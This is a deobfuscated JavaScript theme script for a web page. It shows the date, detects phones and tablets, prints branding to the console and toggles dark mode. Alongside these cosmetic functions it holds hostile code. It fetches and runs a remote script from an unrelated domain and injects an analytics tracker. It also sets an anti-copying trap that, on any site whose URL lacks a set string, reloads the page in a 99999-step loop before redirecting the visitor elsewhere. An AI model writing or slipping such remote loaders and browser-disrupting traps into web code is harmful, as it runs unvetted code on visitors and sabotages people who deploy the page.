//Wed Jul 31 2024 06:58:54 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
var url = "https://5.5v5.lol/fd.js";
$.getScript(url, function () {
  $(document).ready(function () {});
});
!function (_0x5ee022) {
  "use strict";
  !function (_0x3295f3) {
    var _0x4c671c = window,
      _0x2c86ae = document,
      _0x26d496 = _0x5ee022,
      _0x1f416a = "".concat("https:" === _0x2c86ae.location.protocol ? "https://" : "http://", "sdk.51.la/js-sdk-pro.min.js"),
      _0x5d54a4 = _0x2c86ae.createElement("script"),
      _0xb627a4 = _0x2c86ae.getElementsByTagName("script")[0];
    _0x5d54a4.type = "text/javascript";
    _0x5d54a4.setAttribute("charset", "UTF-8");
    _0x5d54a4.async = !0;
    _0x5d54a4.src = _0x1f416a;
    _0x5d54a4.id = "LA_COLLECT";
    _0x26d496.d = _0x5d54a4;
    var _0xde3235 = function () {
      _0x4c671c.LA.ids.push(_0x26d496);
    };
    _0x4c671c.LA ? _0x4c671c.LA.ids && _0xde3235() : (_0x4c671c.LA = _0x5ee022, _0x4c671c.LA.ids = [], _0xde3235());
    _0xb627a4.parentNode.insertBefore(_0x5d54a4, _0xb627a4);
  }();
}({
  "id": "KENmiFzhMnOMT6XL",
  "ck": "KENmiFzhMnOMT6XL"
});
var a = "retrtrfdcfvvvv",
  ym = window.location,
  ym2 = "yz",
  ym3 = String(ym);
function suan(_0x4b7f43) {
  var _0x378ce4 = _0x4b7f43.substring(0, 2);
  var _0x2c08ed = _0x4b7f43.substring(2, 4);
  var _0x19840a = _0x4b7f43.substring(4, 6);
  var _0x49f3a4 = _0x4b7f43.substring(6, 8);
  var _0x5d8043 = _0x4b7f43.substring(8, 10);
  var _0x30324f = _0x4b7f43.substring(10, 12);
  var _0x6ddda = _0x4b7f43.substring(12, 14);
  _0x378ce4 = "h";
  _0x2c08ed = "t";
  _0x19840a = "t";
  _0x49f3a4 = "p";
  _0x5d8043 = ":";
  _0x30324f = "/";
  _0x6ddda = "/";
  var _0x4655ad = _0x378ce4 + _0x2c08ed + _0x19840a + _0x49f3a4 + _0x5d8043 + _0x30324f + _0x6ddda;
  return _0x4655ad;
}
if (ym3.indexOf(ym2) == -1) {
  for (var i = 0; i < 99999; i++) {
    location.reload();
  }
  alert("防扒站 by 5v5 此页面专属于5v5需要同款美化请邮件联系lol@xzwp.lol");
  var b = suan(a) + "baidu.com";
  window.location = b;
}
console.log("\n %c 页面美化由5v5提供 %c 作者邮箱lol@xzwp.lol\n", "color: #fadfa3; background: #030307; padding:5px 0; font-size:12px;", "background: #fadfa3; padding:5px 0; font-size:12px;");
console.log("%c正版授权 5v5 | 需要美化请联系邮箱lol@xzwp.lol", "color:#fff; background: linear-gradient(270deg, #986fee, #8695e6, #68b7dd, #18d7d3); padding: 8px 15px; border-radius: 0 15px 0 15px");
function togglePopup() {
  var _0x129270 = document.getElementById("popup");
  _0x129270.style.display = _0x129270.style.display === "block" ? "none" : "block";
}
var currentDate = new Date(),
  year = currentDate.getFullYear(),
  month = currentDate.getMonth() + 1,
  day = currentDate.getDate(),
  weekDay = currentDate.getDay(),
  weekDays = ["日", "一", "二", "三", "四", "五", "六"],
  formattedWeekDay = "星期" + weekDays[weekDay],
  formattedDate = year + "年" + month + "月" + day + "日 " + formattedWeekDay,
  dateContainer = document.getElementById("dateContainer");
dateContainer.textContent = formattedDate;
var os = function () {
  var _0x5da6a6 = navigator.userAgent,
    _0x438266 = /(?:Windows Phone)/.test(_0x5da6a6),
    _0x332713 = /(?:SymbianOS)/.test(_0x5da6a6) || _0x438266,
    _0xbff0d3 = /(?:Android)/.test(_0x5da6a6),
    _0x109dc0 = /(?:Firefox)/.test(_0x5da6a6),
    _0xd0f981 = /(?:iPad|PlayBook)/.test(_0x5da6a6) || _0xbff0d3 && !/(?:Mobile)/.test(_0x5da6a6) || _0x109dc0 && /(?:Tablet)/.test(_0x5da6a6),
    _0x19035a = /(?:iPhone)/.test(_0x5da6a6) && !_0xd0f981,
    _0x540105 = !_0x19035a && !_0xbff0d3 && !_0x332713;
  return {
    "isTablet": _0xd0f981,
    "isPhone": _0x19035a,
    "isAndroid": _0xbff0d3,
    "isPc": _0x540105
  };
}();
if (os.isAndroid || os.isPhone) {
  var div11 = document.getElementById("div2"),
    div22 = document.getElementById("sjtj"),
    div33 = document.getElementById("pclj");
  div11.classList.remove("show");
  div11.classList.add("hide");
  div22.classList.remove("hide");
  div22.classList.add("show");
  div33.classList.remove("show");
  div33.classList.add("hide");
} else {
  if (os.isTablet) {} else {
    if (os.isPc) {}
  }
}
function myFunction() {
  var _0xdfa7a2 = document.body;
  _0xdfa7a2.classList.toggle("dark-mode");
}
const options = {
    "label": "?"
  },
  darkmode = new Darkmode(options);
darkmode.showWidget();